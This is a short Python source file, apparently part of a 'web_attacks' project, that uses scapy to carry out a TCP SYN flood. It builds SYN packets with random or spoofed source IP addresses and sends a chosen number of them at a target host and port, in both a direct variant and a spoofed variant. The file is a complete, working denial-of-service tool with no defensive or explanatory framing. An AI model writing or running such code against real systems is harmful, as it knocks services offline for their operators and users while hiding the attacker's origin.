from scapy.all import *
from scapy.layers.inet import IP, TCP

from web_attacks.utils import generate_random_ip, generate_random_big_int


def send_syn_packet(target_address: str, target_port: int, source_address: Optional[str]):
    source_port = generate_random_big_int()
    source_seq = generate_random_big_int()
    window_size = generate_random_big_int()

    ip_packet = IP()
    ip_packet.src = source_address if source_address is not None else generate_random_ip()  # Spoofed Attack
    ip_packet.dst = target_address

    tcp_packet = TCP()
    tcp_packet.sport = source_port
    tcp_packet.dport = target_port
    tcp_packet.flags = "S"
    tcp_packet.seq = source_seq
    tcp_packet.window = window_size
    send(ip_packet / tcp_packet, verbose=0)


def perform_syn_flood_direct_attack(target_address: str, target_port: int, number_of_packets: int, client_source_ip: str):
    successful_requests = 0
    for packet in range(number_of_packets):
        try:
            send_syn_packet(target_address, target_port, client_source_ip)
            successful_requests += 1
            print(f"Done sending {packet + 1} packets from source {client_source_ip}.")
        except Exception as e:
            print(f"An error occurred: {e}. Sent {successful_requests} packets. \nGoodbye.")
            break


def perform_syn_flood_spoofed_attack(target_address: str, target_port: int, number_of_packets: int):
    successful_requests = 0
    for packet in range(number_of_packets):
        try:
            send_syn_packet(target_address, target_port, None)
            successful_requests += 1
            print(f"Done sending {packet + 1} packets.")
        except Exception as e:
            print(f"An error occurred: {e}. Sent {successful_requests} packets. \nGoodbye.")
            break
